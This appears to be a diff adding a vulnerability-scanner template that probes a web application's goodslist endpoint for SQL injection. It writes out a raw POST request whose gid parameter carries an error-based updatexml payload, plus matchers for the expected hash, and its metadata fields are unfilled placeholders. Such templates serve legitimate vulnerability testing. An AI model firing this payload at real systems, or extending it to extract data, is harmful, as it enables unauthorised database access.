@@ -1,0 +1,29 @@
+id: shiziyu-goodslist-sqli
+info:
+  name: shiziyu-goodslist-sqli
+  author: apple
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /index.php?s=/Scekill/load_gps_goodslist HTTP/2
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 78
+
+        gid=1229) or %20(updatexml(1,concat(0x7e,(select%20md5(73648273)),0x7e),1))%23
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - '404'
+      - type: word
+        part: body
+        words:
+          - '8f944ae2aec88be6a997e2c77b1a3f4'
